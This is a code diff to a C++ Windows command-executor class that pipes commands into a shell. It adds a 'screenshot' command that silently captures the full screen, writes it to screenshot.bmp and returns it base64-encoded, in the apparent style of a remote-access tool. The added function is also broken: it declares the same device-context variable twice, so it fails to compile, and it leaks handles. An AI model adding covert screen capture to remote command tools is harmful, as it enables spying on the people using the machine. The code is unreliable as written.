@@ -1,5 +1,8 @@
 #include "CommandExecutor.h"
 #include <sstream>
+#include <fstream>
+#include "base64.h"
+#include <vector>
 
 using namespace std;
 
@@ -96,6 +99,9 @@ int CommandExecutor::closePipes() {
 string CommandExecutor::executeCommand(string command) {
     DWORD bytesWritten;
 
+    if (command.find("screenshot") == 0) {
+        return captureScreenshotAndEncode();
+	}
 	command += "\n"; // Make sure command is actually run
 	cout << "Command: " << command << endl;
     BOOL success = WriteFile(hStdinWrite, command.c_str(), command.length(), &bytesWritten, NULL);
@@ -163,6 +169,70 @@ string CommandExecutor::executeCommand(string command) {
     }
 
     return finalOutput;
+}
+
+string CommandExecutor::captureScreenshotAndEncode() {
+    // Capture screenshot and save as BMP
+    int x = GetSystemMetrics(SM_CXSCREEN);
+	int y = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hScreen = GetDC(NULL);
+	HDC hDC = CreateCompatibleDC(hScreen);
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x, y);
+	SelectObject(hDC, hBitmap);
+	BitBlt(hDC, 0, 0, x, y, hScreen, 0, 0, SRCCOPY);
+
+    // Save bitmap to file
+    BITMAP bmp;
+    BITMAPFILEHEADER bf;
+    BITMAPINFOHEADER bi;
+
+    // fill bf and bi
+    // Assume hBitmap is your captured HBITMAP, x and y are width and height
+    GetObject(hBitmap, sizeof(BITMAP), &bmp);
+
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = bmp.bmWidth;
+    bi.biHeight = bmp.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = 24; // 24-bit bitmap
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = ((bmp.bmWidth * 3 + 3) & ~3) * bmp.bmHeight;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrUsed = 0;
+    bi.biClrImportant = 0;
+
+    bf.bfType = 0x4D42; // 'BM'
+    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bf.bfSize = bf.bfOffBits + bi.biSizeImage;
+    bf.bfReserved1 = 0;
+    bf.bfReserved2 = 0;
+
+    // Get the bitmap data
+    std::vector<BYTE> bmpData(bi.biSizeImage);
+    HDC hDC = GetDC(NULL);
+    BITMAPINFO binfo = { 0 };
+    binfo.bmiHeader = bi;
+    GetDIBits(hDC, hBitmap, 0, bmp.bmHeight, bmpData.data(), &binfo, DIB_RGB_COLORS);
+    ReleaseDC(NULL, hDC);
+
+
+    // Write headers and data to file
+    ofstream file("screenshot.bmp", std::ios::binary);
+    file.write(reinterpret_cast<const char*>(&bf), sizeof(bf));
+    file.write(reinterpret_cast<const char*>(&bi), sizeof(bi));
+    file.write(reinterpret_cast<const char*>(bmpData.data()), bmpData.size());
+    file.close();
+
+	ifstream bmpFile("screenshot.bmp", ios::in | ios::binary);
+    vector<unsigned char> buffer((istreambuf_iterator<char>(bmpFile)), {});
+    bmpFile.close();
+
+
+    // Encode to base64
+    string base64Data = base64_encode(buffer.data(), buffer.size());
+    return base64Data;
 }
 
 CommandExecutor::~CommandExecutor() {
